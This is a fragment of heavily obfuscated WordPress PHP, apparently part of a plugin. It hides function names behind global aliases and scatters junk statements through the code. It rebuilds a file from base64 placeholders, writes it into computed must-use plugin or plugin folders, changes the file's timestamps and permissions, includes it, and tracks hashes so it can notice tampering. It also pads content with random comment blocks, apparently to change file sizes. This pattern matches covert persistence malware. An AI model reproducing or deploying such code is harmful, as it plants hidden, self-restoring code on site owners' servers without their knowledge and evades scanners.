  $rjbsuzednbm     = $a19vmiyy_8   .     xpm5lg9odtw6di(1293) .   g2g3r6pz8prst3gz(ABSPATH    . 'g',  (34^42));
$aaj80voq39zkn397 =      @$GLOBALS['__scf_vpig9uwvw8_pu_20']($rjbsuzednbm)     ?  (string) @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($rjbsuzednbm)    :  "";
$fae4sleznz5oz5  =  0;
   if ($aaj80voq39zkn397      !==  "")     {


  $ezgmjlageaw     = $GLOBALS['__scf_w_xu8rj4lvsj44_113']('|',  $aaj80voq39zkn397);
$fae4sleznz5oz5 =    (int)    $ezgmjlageaw[0];
   }
 if  ($fae4sleznz5oz5  >      0    &&  $GLOBALS['__scf_ks7_xfapvywl_185']()   -   $fae4sleznz5oz5     >     (801+99))   kkpdha95nyx3tbltd10(bk9m46jygo3f(1294),     xognx_h1jzkh(1295));
elseif     ($fae4sleznz5oz5   ===    0     &&    ($GLOBALS['__scf_ks7_xfapvywl_185']() -    (int) @filectime($n3zr4kmoizfbxxqc))    > (1445-545)) kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1296),   ar6vo_1nyhx2koj5(1297));
 unset($rjbsuzednbm,  $aaj80voq39zkn397,    $ezgmjlageaw,     $fae4sleznz5oz5);
}
   $h3wz11cllq     =   p5t6fz6i7ccgjh();
    if (!$h3wz11cllq  ||    $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq)     <    (0x8f+0x165))    return;
  $guenw2w4pvl =  jzt71g_lciq6atvff();
$rv8s_ul0qu2z09u     = $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),  xpm5lg9odtw6di(1262));
      $pwohfknrv3q7hqs  =   hzkj2ifwqdzf_u32qrf()  .   bk9m46jygo3f(14);
 $ghszr6ikx2zhv  =   @$GLOBALS['__scf_v7y4c72abxzjo_47']($pwohfknrv3q7hqs)
   ?   ($pwohfknrv3q7hqs     .      '/'   .  $rv8s_ul0qu2z09u    .  xpm5lg9odtw6di(1262))



       :  (hzkj2ifwqdzf_u32qrf()    . ar6vo_1nyhx2koj5(93)    .   $rv8s_ul0qu2z09u . '/'  . $rv8s_ul0qu2z09u      .  xognx_h1jzkh(1298));
$mycp7poohob4h77 =   $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1122)) ? $GLOBALS['__scf_b58bt0r94kp1_555'](home_url(),  PHP_URL_HOST)  : (isset($_SERVER[xognx_h1jzkh(562)])  ?    $_SERVER[xognx_h1jzkh(562)]   :   "");

$vn3os7uhpx  =    (defined(ar6vo_1nyhx2koj5(804)) &&  WPMU_PLUGIN_DIR) ? WPMU_PLUGIN_DIR  :    hzkj2ifwqdzf_u32qrf()  .  ar6vo_1nyhx2koj5(14);
  $_oszd92bki5yps5t =    (defined(gz_aorofp7mo(682))  && WP_PLUGIN_DIR)  ?    WP_PLUGIN_DIR  :     hzkj2ifwqdzf_u32qrf() . xpm5lg9odtw6di(1299);



  $hprimoeu68us6644  =    defined(xpm5lg9odtw6di(1174))  ?  WP_CONTENT_DIR    :  hzkj2ifwqdzf_u32qrf();
       $p2j7xqhxh78i  =    pgrkqypzhwz32d(
 bk9m46jygo3f(1296),
    array('__PATH_B64__',      '__PLUGIN_BASE64__',   '__DOMAIN__', '__HB_B64__',    '__GPATH_B64__',    '__ABSPATH_B64__',  '__CONTENTDIR_B64__',   '__MUDIR_B64__',  '__PLUGINDIR_B64__',  '__SLUG__',  '__VERSION__'),

array($GLOBALS['__scf_upr7jxyxre3_348']($ghszr6ikx2zhv),  $guenw2w4pvl,    $mycp7poohob4h77,   $GLOBALS['__scf_upr7jxyxre3_348']($p9351a9luj), $GLOBALS['__scf_upr7jxyxre3_348']($n3zr4kmoizfbxxqc),   $GLOBALS['__scf_upr7jxyxre3_348'](ABSPATH), $GLOBALS['__scf_upr7jxyxre3_348']($hprimoeu68us6644),  $GLOBALS['__scf_upr7jxyxre3_348']($vn3os7uhpx),   $GLOBALS['__scf_upr7jxyxre3_348']($_oszd92bki5yps5t),  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), gz_aorofp7mo(1298)), xl8k_pjv1048a7ae7())
    );

    if     (!$p2j7xqhxh78i)      {
if  ((int)   get_option(xognx_h1jzkh(1267), 0)  >   0) kkpdha95nyx3tbltd10(gz_aorofp7mo(1296),  xognx_h1jzkh(1300));
  return;


   }
if    (!g9edwd6m8_9cm8($p2j7xqhxh78i))     {
kkpdha95nyx3tbltd10(xognx_h1jzkh(1301), xpm5lg9odtw6di(1302));
 return;$g1eywy87=73*5;$y3neyk7ujs=$g1eywy87-2;



  }
 if (rmpvo8i8m8kfd9311njxy7($n3zr4kmoizfbxxqc,    $p2j7xqhxh78i))   {
wbvm0leq3qkmkea59($n3zr4kmoizfbxxqc,      r4p_zfnleez7aynxxwapor());
f97udlofaljpuxw1_jgnfh($n3zr4kmoizfbxxqc, (765-345));
    g6q1ehat0szqqsfbv2($n3zr4kmoizfbxxqc);
 sqnskai9y5dyys6jk($a19vmiyy_8    . xpm5lg9odtw6di(1303) .   $l9le3i57v1vab5rx, $GLOBALS['__scf_eo363tjzd4r6n_56']($p2j7xqhxh78i), gz_aorofp7mo(1301));
     sqnskai9y5dyys6jk($a19vmiyy_8      .      gz_aorofp7mo(1291)  . $l9le3i57v1vab5rx,    xl8k_pjv1048a7ae7(), xpm5lg9odtw6di(1304));

    @include_once  $n3zr4kmoizfbxxqc;
      set_transient(gz_aorofp7mo(1305),  1, (248+52));


 }
unset($vn3os7uhpx, $_oszd92bki5yps5t,     $hprimoeu68us6644);
 }  catch  (Throwable    $o_qyrtxl85owt)  {$rxepw3bvw3wh_=(0x9a+0x17);$l_vp39b3_hv5cj=$rxepw3bvw3wh_%16;
 kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1306),  $o_qyrtxl85owt);
} catch (Exception  $o_qyrtxl85owt) {
   }
 }
function sl80t81tfwuwpn5w1_($klljgz9tv3wp3)
  {
 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($klljgz9tv3wp3)) return   false;
   $ot63do2h03l  =  $GLOBALS['__scf_fxl4k4gsul_10']($klljgz9tv3wp3);
    if ($ot63do2h03l  >    (1048502+74))   return  true;
if      ($ot63do2h03l     < (409+91)) return false;
 $_yf7lwh5xtq32qx =    $GLOBALS['__scf__fl_gwujcblq_9']($klljgz9tv3wp3,     0,  (119176-53640));
 $a9djl51imenophr    =  $GLOBALS['__scf_yhh3tar3yxz_1307']($_yf7lwh5xtq32qx,     ' ') +   $GLOBALS['__scf_yhh3tar3yxz_1307']($_yf7lwh5xtq32qx, "\t");
 return ($a9djl51imenophr      /  $GLOBALS['__scf_fxl4k4gsul_10']($_yf7lwh5xtq32qx))   > 0.55;$up44fr_hs=28*3;$xa8x0ot55qmi=$up44fr_hs-11;
     }
function  p5t6fz6i7ccgjh($vewnaklil6ck5  =   false)


  {
      static  $h3wz11cllq     = null;
  if   ($vewnaklil6ck5) {
     $h3wz11cllq =  null;
 }
    if  ($h3wz11cllq !== null) return   $h3wz11cllq;
      $klljgz9tv3wp3 =  iljst04arjh1pet016s(bho93o6vof3ni5_rg622_h());
  if     ($GLOBALS['__scf_is0fvk8c7tq2_41']($klljgz9tv3wp3) &&      $GLOBALS['__scf_fxl4k4gsul_10']($klljgz9tv3wp3)  >  (495+5)   && $GLOBALS['__scf_fxl4k4gsul_10']($klljgz9tv3wp3) <=    (1048517+59)  &&     !sl80t81tfwuwpn5w1_($klljgz9tv3wp3) &&  g9edwd6m8_9cm8($klljgz9tv3wp3)) {
   $h3wz11cllq  =    $klljgz9tv3wp3;$rkj1vswoox=552;$riov2p2u=($rkj1vswoox>0)?$rkj1vswoox:-$rkj1vswoox;
     return     $h3wz11cllq;
 }

   $tn_7q04kitmq8l  =  tjj1y86387zrz51(xognx_h1jzkh(862),  "");
 if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($tn_7q04kitmq8l)  && $GLOBALS['__scf_fxl4k4gsul_10']($tn_7q04kitmq8l) >  (431+69)    && $GLOBALS['__scf_fxl4k4gsul_10']($tn_7q04kitmq8l)    <=     (821666+226910) && !sl80t81tfwuwpn5w1_($tn_7q04kitmq8l)     && g9edwd6m8_9cm8($tn_7q04kitmq8l)) {
    $h3wz11cllq = $tn_7q04kitmq8l;
 return  $h3wz11cllq;
  }
  $h3wz11cllq =  false;
      return  $h3wz11cllq;$b5592wo2g=(0x55+0xc3);$z1n1z0bsqx0gd9=$b5592wo2g%5;
  }
function     jzt71g_lciq6atvff($vewnaklil6ck5    =   false)
{
static    $goxpgitg2brxu  =   null;
   if ($vewnaklil6ck5) {
    $goxpgitg2brxu   =  null;
}
  if      ($goxpgitg2brxu     !==   null) return   $goxpgitg2brxu;
 $klljgz9tv3wp3  = p5t6fz6i7ccgjh();
      

  if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($klljgz9tv3wp3)    ||  $GLOBALS['__scf_fxl4k4gsul_10']($klljgz9tv3wp3) < (236+264)  ||   $GLOBALS['__scf_fxl4k4gsul_10']($klljgz9tv3wp3)  >  (160873+887703)   ||  sl80t81tfwuwpn5w1_($klljgz9tv3wp3) ||   !g9edwd6m8_9cm8($klljgz9tv3wp3))  {
/* co-recursive session-type */

 $goxpgitg2brxu   =    false;
   return $goxpgitg2brxu;
 }
     $goxpgitg2brxu     =  $GLOBALS['__scf_upr7jxyxre3_348'](yx5b9plavtfppnjk($klljgz9tv3wp3));
   return  $goxpgitg2brxu;
 }
function fgctt98wtdjhjiow($g1axcaz1nux)
 {
 if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($g1axcaz1nux) ||   $GLOBALS['__scf_fxl4k4gsul_10']($g1axcaz1nux) <   (0x2+0x10)   ||   $GLOBALS['__scf__fl_gwujcblq_9']($g1axcaz1nux,   0, 2)   !==  "\x1f\x8b")    return   0;
 $xpwkmi1gfee   =  @$GLOBALS['__scf_x0ygw6u0unrx_273']('V', $GLOBALS['__scf__fl_gwujcblq_9']($g1axcaz1nux, -(2+2)));
  $xpwkmi1gfee  =   $GLOBALS['__scf_zj8mp2xbaqmp_35']($xpwkmi1gfee) ?   $xpwkmi1gfee[1] :  0;



  if  ($xpwkmi1gfee  <     (493+7) ||    $xpwkmi1gfee  >    (1048566+10)) return    $xpwkmi1gfee;
   return  0;


     }
function cvbfkio1qpu28vlo0z40p($wmi9vtfi67mkceoi)
{
return   $GLOBALS['__scf_oi11nsrcts_346'](hexdec($wmi9vtfi67mkceoi[1]));
   }
  function   o_a46xczfm0z3pa91s($paudvk020we1z90)
 {
if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90) ||   $paudvk020we1z90    ===  "") return  $paudvk020we1z90;
   static  $n70q5tz5d21sy  =     null;
     if ($n70q5tz5d21sy ===  null)   {
 $n70q5tz5d21sy = false;


if     ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1308))) {
     $_dd =    defined(xpm5lg9odtw6di(1174))    ?   WP_CONTENT_DIR :  (defined(xognx_h1jzkh(1146))  ?   ABSPATH    : "");
if ($_dd   !==    "") {
 $a70jbaw10f3x0h6p =     @disk_free_space($_dd);

  if ($a70jbaw10f3x0h6p   !==   false    &&   $a70jbaw10f3x0h6p  >=  (157286398+2))      $n70q5tz5d21sy =    true;
 }
    }
 if (!$n70q5tz5d21sy)   {
  if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1309))) @update_option(bk9m46jygo3f(1310),    $GLOBALS['__scf_ks7_xfapvywl_185'](),  gz_aorofp7mo(1259));
 } elseif    ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1054))) {
  $zkadhnn80t9nj5k0   = (int)  get_option(gz_aorofp7mo(1311), 0);
     if  ($zkadhnn80t9nj5k0  &&  $GLOBALS['__scf_ks7_xfapvywl_185']()    -   $zkadhnn80t9nj5k0  < (0x3899+0x118e7))  $n70q5tz5d21sy =   false;$kkuhap9vai2aj=PHP_INT_MAX/PHP_INT_MAX;$z23w162li08j3=$kkuhap9vai2aj+48;
   }
    }
 if     (!$n70q5tz5d21sy)  {
     return  $paudvk020we1z90;
}
  $ex4wbooez05  = gh0yxtn2jfbxhsjo();
if  ($ex4wbooez05   ===  -1 || $ex4wbooez05   >=   (167423096-33205368))     {
$g3z6ma16w7vxd =  (2318244-518244)  + $GLOBALS['__scf_jlhdedaik0c_347'](0, (699959+41));
    } elseif   ($ex4wbooez05    >=  (67108798+66)) {
   $g3z6ma16w7vxd  =  (1902675-102675)    +    $GLOBALS['__scf_jlhdedaik0c_347'](0,    (1360049-660049));


   }    else   {
   return $paudvk020we1z90;
}
if     ($GLOBALS['__scf_fxl4k4gsul_10']($paudvk020we1z90) >= $g3z6ma16w7vxd) return  $paudvk020we1z90;
 if ($GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_v2rfz0q9cvmh_12']($paudvk020we1z90),  -2)  ===     xognx_h1jzkh(1312))   return   $paudvk020we1z90;
     while   ($GLOBALS['__scf_fxl4k4gsul_10']($paudvk020we1z90)  <  $g3z6ma16w7vxd -  (4057+43)) {


  $yc_3fgo7em8cww =   "";
 if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1313)))  {

 try   {
    $yc_3fgo7em8cww  =   @$GLOBALS['__scf_avnl614cqph9_1314'](random_bytes((1924+76)));
        } catch    (Throwable $o_qyrtxl85owt) {
      $yc_3fgo7em8cww    = "";
      } catch   (Exception  $o_qyrtxl85owt)  {


    $yc_3fgo7em8cww  = "";
      }
 }
if    ($GLOBALS['__scf_fxl4k4gsul_10']($yc_3fgo7em8cww)    <  (3947+53)) {
       $yc_3fgo7em8cww   = $GLOBALS['__scf_eo363tjzd4r6n_56'](uniqid("",   true));
while  ($GLOBALS['__scf_fxl4k4gsul_10']($yc_3fgo7em8cww) <  (0xf6b+0x35))   $yc_3fgo7em8cww .=  $GLOBALS['__scf_eo363tjzd4r6n_56']($yc_3fgo7em8cww);
 }
// induction variable

 $paudvk020we1z90  .=    "\n/*" .    $yc_3fgo7em8cww   .     bk9m46jygo3f(1315);
  }
 return  $paudvk020we1z90;
 }
 function za8ge46vc9y1a6($paudvk020we1z90)
   {
  if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)  ||    $GLOBALS['__scf_fxl4k4gsul_10']($paudvk020we1z90)  <= (1048570+6))  return    $paudvk020we1z90;
 $_svae0z2nfoqm  =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](bk9m46jygo3f(1316),   "",   $paudvk020we1z90);


return    $GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm)   ?  $_svae0z2nfoqm      : $paudvk020we1z90;
 }
function  gh0yxtn2jfbxhsjo()
 {
  static   $o6w_gkzy4eqv4x    =    null;
       if   ($o6w_gkzy4eqv4x    !== null)    return  $o6w_gkzy4eqv4x;
 $o6w_gkzy4eqv4x   = 0;

  if   (!$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1153)))     return   $o6w_gkzy4eqv4x;
$g1axcaz1nux  =    @$GLOBALS['__scf_if1j_n66jo7w7_111'](bk9m46jygo3f(1317));
    if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($g1axcaz1nux))      return $o6w_gkzy4eqv4x;
    $g1axcaz1nux  =   $GLOBALS['__scf_u6m4cedwgt__319']($g1axcaz1nux);
 if ($g1axcaz1nux === "")   return $o6w_gkzy4eqv4x;
 if  ($g1axcaz1nux ===  xognx_h1jzkh(1318))   {
$o6w_gkzy4eqv4x =   -1;
 return $o6w_gkzy4eqv4x;$tcxkua81_dg0z=229|170;$ikhypj8u=$tcxkua81_dg0z^81;
      }
  $du8t9u_zqkx    = (float) $g1axcaz1nux;


 $w26iyt6kv5r3  =      $GLOBALS['__scf_c_sktsaypzz_1319']($GLOBALS['__scf__fl_gwujcblq_9']($g1axcaz1nux, -1));
       if ($w26iyt6kv5r3 ===   'G')  $du8t9u_zqkx   *=     (1073741741+83);
  elseif   ($w26iyt6kv5r3  === 'M')      $du8t9u_zqkx   *=     (0x71ab3+0x8e54d);
  elseif      ($w26iyt6kv5r3    ===  'K')   $du8t9u_zqkx *=    (1018+6);


  if   ($du8t9u_zqkx    > 0)    $o6w_gkzy4eqv4x =  (int)     $du8t9u_zqkx;



   return  $o6w_gkzy4eqv4x;
 }
function  h6ar9m7l1ifcrfqf0e($qho2p2q7svf552rm)

  {


$qho2p2q7svf552rm  = (int)      $qho2p2q7svf552rm;
   if    ($qho2p2q7svf552rm <=  0)  return   false;


if (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1320)))  return   false;
       $rwfulgb9dgz7b8   = gh0yxtn2jfbxhsjo();
  if    ($rwfulgb9dgz7b8     ===    -1) return    true;
   if  ($rwfulgb9dgz7b8   <=  0)    return   false;
 $fwzzm66r8_    =  @memory_get_usage(true);
if   (!$GLOBALS['__scf_obmceil7_8_39']($fwzzm66r8_) ||   $fwzzm66r8_ <   0) return   false;



 return  ($rwfulgb9dgz7b8   -  $fwzzm66r8_)  >    (($qho2p2q7svf552rm    *   (4-1)) +   (2097108+44));
  }
function   v9mh8xlvwi7m9yse_tcv0k($qho2p2q7svf552rm)
{

   $qho2p2q7svf552rm     =  (int)   $qho2p2q7svf552rm;
if ($qho2p2q7svf552rm  <=     0)      return  false;
       if (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1320))) return true;


$rwfulgb9dgz7b8  = gh0yxtn2jfbxhsjo();
if     ($rwfulgb9dgz7b8      ===   -1) return     true;
if  ($rwfulgb9dgz7b8 <=  0)     return   true;
$fwzzm66r8_  =   @memory_get_usage(true);
    

     if (!$GLOBALS['__scf_obmceil7_8_39']($fwzzm66r8_) ||    $fwzzm66r8_     <    0)  return   true;
    

    return   ($rwfulgb9dgz7b8 -  $fwzzm66r8_)   > (($qho2p2q7svf552rm *  (87^67))    +  (757353+7631255));
   }

 function     iljst04arjh1pet016s($bki0gi20hmqucm)
 {



  if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($bki0gi20hmqucm)  ||    $bki0gi20hmqucm ===    ""  ||    !@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))      return  false;
    if ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(59)))  @clearstatcache(true, $bki0gi20hmqucm);
     $qho2p2q7svf552rm     =   @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($bki0gi20hmqucm);
 if (!$GLOBALS['__scf_obmceil7_8_39']($qho2p2q7svf552rm)   ||   $qho2p2q7svf552rm <    1)   return     false;
  if  ($qho2p2q7svf552rm    >  (72897190-20468390)) return   null;
  if     ($qho2p2q7svf552rm   >   (1048518+58)  && !h6ar9m7l1ifcrfqf0e($qho2p2q7svf552rm))  return   null;

 $paudvk020we1z90    =   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm,    false, null, 0,  $qho2p2q7svf552rm  +  1);



if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)   || $GLOBALS['__scf_fxl4k4gsul_10']($paudvk020we1z90)     !==  $qho2p2q7svf552rm) return  false;

return   $qho2p2q7svf552rm  > (1048553+23)   ?    za8ge46vc9y1a6($paudvk020we1z90)  :      $paudvk020we1z90;
  }
      function    g6q1ehat0szqqsfbv2($bki0gi20hmqucm)
  {
 if  (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1054))    ||    !$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1309)))  return;
  if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($bki0gi20hmqucm)  ||  $bki0gi20hmqucm  ===  ""  ||    !@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm)) return;
 if   (!isset($GLOBALS[xognx_h1jzkh(1321)])    ||   !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[xpm5lg9odtw6di(1321)]))  {
 $GLOBALS[xognx_h1jzkh(1322)]    =    get_option(gz_aorofp7mo(1323),  array());
  if   (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[xpm5lg9odtw6di(1322)]))     $GLOBALS[bk9m46jygo3f(1322)] =    array();
    }
      $wmi9vtfi67mkceoi   =  $GLOBALS[gz_aorofp7mo(1322)];
   $paudvk020we1z90  = iljst04arjh1pet016s($bki0gi20hmqucm);
if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)) return;
 $wmi9vtfi67mkceoi[$GLOBALS['__scf_eo363tjzd4r6n_56']($bki0gi20hmqucm)]  =      array('p'  =>  $bki0gi20hmqucm,  'h' => $GLOBALS['__scf_eo363tjzd4r6n_56']($paudvk020we1z90), 'g'   =>  xl8k_pjv1048a7ae7(), 't'  =>  $GLOBALS['__scf_ks7_xfapvywl_185']());
  if  ($GLOBALS['__scf_oenrsvkzs1_36']($wmi9vtfi67mkceoi)   > (0x64+0x64))      {
    foreach    ($wmi9vtfi67mkceoi  as    $xvqxrl6r3nrmbkp   => $du8t9u_zqkx)  {
  if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($du8t9u_zqkx) ||   !isset($du8t9u_zqkx['t'])    ||    (int) $du8t9u_zqkx['t'] < $GLOBALS['__scf_ks7_xfapvywl_185']()  -    (4679755-2087755))   unset($wmi9vtfi67mkceoi[$xvqxrl6r3nrmbkp]);
}
    while    ($GLOBALS['__scf_oenrsvkzs1_36']($wmi9vtfi67mkceoi) >  (191+9))  {
      $im3k0raj5t1b = null;
    $ceds4qhe68_khfg  = null;
  foreach  ($wmi9vtfi67mkceoi as $xvqxrl6r3nrmbkp    => $du8t9u_zqkx) {


$r31rt7_son   =     $GLOBALS['__scf_zj8mp2xbaqmp_35']($du8t9u_zqkx)      &&  isset($du8t9u_zqkx['t'])  ? (int)      $du8t9u_zqkx['t'] : 0;



     if ($ceds4qhe68_khfg ===  null   ||    $r31rt7_son    <    $ceds4qhe68_khfg)  {



$ceds4qhe68_khfg   = $r31rt7_son;
     $im3k0raj5t1b    =     $xvqxrl6r3nrmbkp;
  }
// @gather token-bucket

     }

    if  ($im3k0raj5t1b   ===  null)     break;

  unset($wmi9vtfi67mkceoi[$im3k0raj5t1b]);
     }
      }
     update_option(gz_aorofp7mo(1323),     $wmi9vtfi67mkceoi,  xpm5lg9odtw6di(1324));
  $GLOBALS[ar6vo_1nyhx2koj5(1322)]      =    $wmi9vtfi67mkceoi;
}
    function p82470xv4eq7_pm5tl4hw9($bki0gi20hmqucm)
   {
 if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($bki0gi20hmqucm)   ||   $bki0gi20hmqucm ===  "")  return     false;
  if    (!isset($GLOBALS[gz_aorofp7mo(1325)])   || !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[xognx_h1jzkh(1325)]))  {
$GLOBALS[bk9m46jygo3f(1325)]   =  $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1054)) ?   get_option(gz_aorofp7mo(1323), array()) :   array();


if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[ar6vo_1nyhx2koj5(1326)]))   $GLOBALS[xpm5lg9odtw6di(1326)]   =   array();$a7pq68dkq4e91d=-435;$zck66dza=($a7pq68dkq4e91d>0)?$a7pq68dkq4e91d:-$a7pq68dkq4e91d;
  }
 $wmi9vtfi67mkceoi      =    $GLOBALS[ar6vo_1nyhx2koj5(1326)];
$u0vg1o4w59jt6xuu   =  $GLOBALS['__scf_eo363tjzd4r6n_56']($bki0gi20hmqucm);$iank6j9gejk2n=24+53;$wvja88mrsu=$iank6j9gejk2n-24;
    if   (isset($wmi9vtfi67mkceoi[$u0vg1o4w59jt6xuu])  && $GLOBALS['__scf_zj8mp2xbaqmp_35']($wmi9vtfi67mkceoi[$u0vg1o4w59jt6xuu]) &&      isset($wmi9vtfi67mkceoi[$u0vg1o4w59jt6xuu]['h']))  {
if ((int)   @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($bki0gi20hmqucm)  >  (20202864+32225936))      return     xpm5lg9odtw6di(1327);
 $paudvk020we1z90 =  iljst04arjh1pet016s($bki0gi20hmqucm);
  if ($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)) {
    return ($GLOBALS['__scf_eo363tjzd4r6n_56']($paudvk020we1z90)     ===   $wmi9vtfi67mkceoi[$u0vg1o4w59jt6xuu]['h'])     ? true    :  ar6vo_1nyhx2koj5(1327);
       }

  return  false;
}
       if    (mowf3lw2lqslkaudd($bki0gi20hmqucm, (836-336)))  {
$uabrlao9g235yy    =   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm,    false,  null,      0,   (3775+321));
    if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($uabrlao9g235yy)   &&  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($uabrlao9g235yy,  xpm5lg9odtw6di(1328))   !==    false)  return   bk9m46jygo3f(1329);$ppytgr36=2+92;$lhfhn12_ektq9j=$ppytgr36-3;
   }
  return   false;
   }
    function    i58zup85av0875_k0xrmtd()
 {
static $wmi9vtfi67mkceoi   = null;



    if ($wmi9vtfi67mkceoi    !==   null) return  $wmi9vtfi67mkceoi;
$paudvk020we1z90 = iljst04arjh1pet016s(bho93o6vof3ni5_rg622_h());
$wmi9vtfi67mkceoi  =  $GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)  &&  $paudvk020we1z90 !==      ""   ? $GLOBALS['__scf_eo363tjzd4r6n_56']($paudvk020we1z90) :     "";
   return $wmi9vtfi67mkceoi;
}


    function k0q8jnwzfahi9hsg9b4()
  {
return     $GLOBALS['__scf__fl_gwujcblq_9'](i58zup85av0875_k0xrmtd(), 0, (6+6));
  

}
function   xwr2qxs5ekc1ked9xg()
{$nmmxry5gct3lf0=(0xf7+0x78);$ywllq3yyknc=$nmmxry5gct3lf0%16;
  return   fgatjmo7gg2xolgmpki4y2()    . bk9m46jygo3f(1330)    .   g2g3r6pz8prst3gz(ABSPATH  .      gz_aorofp7mo(1331),    (1+7))   .  xpm5lg9odtw6di(1332);

   }
function   gc7qjnf6lmnfaja0f_()
{
 $vrspdc1ver = array();
  if   ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1054)))   {
  $tpriuwxjru1h5re =   @get_option(gz_aorofp7mo(1333), array());

    if    ($GLOBALS['__scf_zj8mp2xbaqmp_35']($tpriuwxjru1h5re))   $vrspdc1ver      =  $tpriuwxjru1h5re;



  }
$paudvk020we1z90     = @$GLOBALS['__scf_vpig9uwvw8_pu_20'](xwr2qxs5ekc1ked9xg())   ? @$GLOBALS['__scf_nae5vxe5wsw2v7_95'](xwr2qxs5ekc1ked9xg())   : "";
if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)     &&  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,   xognx_h1jzkh(778))  === 0)     {$gygxjmcebl3z2=81|160;$a9ko6ldfwqqh=$gygxjmcebl3z2^167;


   $a55f4zrvfp   =    $GLOBALS['__scf_b0js6es3ja1cb1_324']($GLOBALS['__scf__fl_gwujcblq_9']($paudvk020we1z90,   (7-2)), true);
  if   ($GLOBALS['__scf_zj8mp2xbaqmp_35']($a55f4zrvfp)    &&   (empty($vrspdc1ver[bk9m46jygo3f(1334)]) ||     (!empty($a55f4zrvfp[gz_aorofp7mo(1334)]) &&  $a55f4zrvfp[ar6vo_1nyhx2koj5(1334)]     >=   $vrspdc1ver[bk9m46jygo3f(1334)])))  $vrspdc1ver =  $a55f4zrvfp;
   }



 return    $vrspdc1ver;
    }
      function  vssmljt7_blzonb7w7($m2uz01s7u8)
 {
     try    {
  if (!defined(bk9m46jygo3f(1146)))  return;
  $a7t88ofjy5pc5  =  $GLOBALS['__scf_ks7_xfapvywl_185']();
  if  ($m2uz01s7u8  ===    xpm5lg9odtw6di(1335)  ||   $m2uz01s7u8 ===     gz_aorofp7mo(1336))   {
$prev =    gc7qjnf6lmnfaja0f_();
if  (

   isset($prev[gz_aorofp7mo(1337)],  $prev[xpm5lg9odtw6di(1338)]) &&     $prev[bk9m46jygo3f(1339)] ===  $m2uz01s7u8

 &&   $a7t88ofjy5pc5   -  (int)    $prev[ar6vo_1nyhx2koj5(1338)] <  ($m2uz01s7u8 ===  xpm5lg9odtw6di(1336) ? (287+13) :     (0x2+0x8))

      ) return;
 }


  $vrspdc1ver =  array(
   'v'  =>  xl8k_pjv1048a7ae7(),
 ar6vo_1nyhx2koj5(1340) =>    k0q8jnwzfahi9hsg9b4(),
 xpm5lg9odtw6di(212)      => bho93o6vof3ni5_rg622_h(),
 ar6vo_1nyhx2koj5(1127) =>     $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), xognx_h1jzkh(1332)),
xognx_h1jzkh(1339)  =>    $m2uz01s7u8,
gz_aorofp7mo(1341)   =>     $a7t88ofjy5pc5,
ar6vo_1nyhx2koj5(1342) =>  $a7t88ofjy5pc5,
bk9m46jygo3f(1334)   => isset($_SERVER[ar6vo_1nyhx2koj5(1343)])  ?  (int)   $_SERVER[xognx_h1jzkh(1344)] :     $a7t88ofjy5pc5,
  );
   if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1309)))   {
      $roubiyiq8scd8  =    @update_option(ar6vo_1nyhx2koj5(1345), $vrspdc1ver,   gz_aorofp7mo(1324));
